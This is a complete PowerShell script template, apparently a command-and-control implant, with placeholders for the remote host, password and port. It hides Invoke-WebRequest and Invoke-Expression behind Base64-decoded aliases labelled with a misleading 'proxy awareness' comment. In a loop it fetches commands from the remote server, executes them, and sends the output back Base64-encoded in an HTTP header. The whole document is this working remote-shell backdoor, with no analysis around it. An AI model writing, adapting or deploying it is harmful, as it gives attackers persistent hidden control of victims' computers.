$rh =   "<REMOTEHOST>";
$passwd =  "<PASSWORD>";
$id =   "<ID>";
$port = "<PORT>";
$cmd_time = "<TIME>"; 

$url = "http://$rh`:$port/id/$id";

# add proxy awareness 
Set-Alias -Name "mwr" -Value $([System.Text.Encoding]::utf8.GetString([System.Convert]::FromBase64String("aXdy")));
Set-Alias -Name "rcn" -Value $([System.Text.Encoding]::utf8.GetString([System.Convert]::FromBase64String("aWV4")));

$headers = @{'Authorization' = $passwd};
while($true){
    $r = rcn $(mwr -Uri $url -Headers $headers).Content;
    if ($(mwr -Uri $url -Headers @{'Authorization' = $passwd; 'WWW-Authenticate' = $([System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($r)))}).Content -eq "ok"){
        Start-Sleep -Seconds $cmd_time;
    } else {
        break;
    }
}